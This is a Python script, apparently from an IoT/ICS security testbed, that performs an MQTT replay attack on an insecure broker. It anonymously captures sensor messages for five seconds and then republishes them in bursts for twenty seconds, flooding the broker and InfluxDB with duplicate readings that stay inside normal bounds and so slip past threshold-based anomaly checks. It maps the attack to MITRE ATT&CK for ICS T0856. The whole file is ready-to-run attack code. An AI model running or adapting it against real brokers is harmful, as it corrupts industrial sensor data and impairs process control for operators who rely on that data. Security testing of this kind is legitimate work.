#!/usr/bin/env python3
"""
06_replay.py - MQTT Replay Attack (Insecure Environment)

Captures legitimate sensor messages via anonymous subscription and
replays them in bulk to flood the broker with duplicate data. This
corrupts the time-series stored in InfluxDB without requiring any
knowledge of the expected value ranges (replayed values are always
within normal bounds, bypassing simple threshold-based anomaly checks).

Attack flow:
  Phase 1 — Capture (5 s): Subscribe to sensors/# and collect messages.
  Phase 2 — Replay (20 s): Rapidly republish all captured messages in a
            loop, flooding the broker with duplicate sensor readings.

Expected result (insecure): Throughput spikes 10-20x above baseline;
InfluxDB is flooded with duplicate readings from the last 5 seconds.

MITRE ATT&CK for ICS:
  Tactic   : Impair Process Control (TA0106)
  Technique: T0856 — Spoof Reporting Message
"""

import os
import sys
import time
import paho.mqtt.client as mqtt

BROKER       = os.getenv("BROKER_HOST", "172.20.0.20")
PORT         = int(os.getenv("BROKER_PORT", "1883"))
TOPIC_FILTER = "sensors/#"
CAPTURE_SECS = 5
REPLAY_SECS  = 20

# ── Phase 1: Capture ──────────────────────────────────────────────────────────

captured = []

def on_connect_cap(client, userdata, flags, reason_code, properties):
    if reason_code == 0:
        client.subscribe(TOPIC_FILTER, qos=0)
        print(f"[*] Subscribed to {TOPIC_FILTER} — capturing for {CAPTURE_SECS}s")
    else:
        print(f"[-] Connection refused (rc={reason_code})")

def on_message_cap(client, userdata, msg):
    captured.append((msg.topic, bytes(msg.payload)))

cap = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="replay_capture")
cap.on_connect = on_connect_cap
cap.on_message = on_message_cap

try:
    cap.connect(BROKER, PORT, keepalive=60)
    cap.loop_start()
    time.sleep(CAPTURE_SECS)
    cap.loop_stop()
    cap.disconnect()
except Exception as e:
    print(f"[-] Capture failed: {e}")
    sys.exit(1)

print(f"[*] Captured {len(captured)} messages from {TOPIC_FILTER}")

if not captured:
    print("[-] No messages captured — broker may be unreachable or empty")
    sys.exit(0)

# ── Phase 2: Replay ───────────────────────────────────────────────────────────

print(f"[*] Replaying {len(captured)} messages in bursts for {REPLAY_SECS}s...")

rep = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="replay_flood")

try:
    rep.connect(BROKER, PORT, keepalive=60)
    rep.loop_start()

    start = time.time()
    total = 0
    bursts = 0
    while time.time() - start < REPLAY_SECS:
        for topic, payload in captured:
            rep.publish(topic, payload, qos=0)
            total += 1
        bursts += 1
        time.sleep(0.3)

    rep.loop_stop()
    rep.disconnect()

except Exception as e:
    print(f"[-] Replay failed: {e}")
    sys.exit(1)

elapsed = round(time.time() - time.time() + REPLAY_SECS, 1)
print(f"[+] Replay complete: {total} messages across {bursts} bursts in {REPLAY_SECS}s")
print(f"[+] Effective publish rate: ~{round(total / REPLAY_SECS, 1)} msg/s")
print(f"[!] InfluxDB now contains {total} duplicate sensor readings")
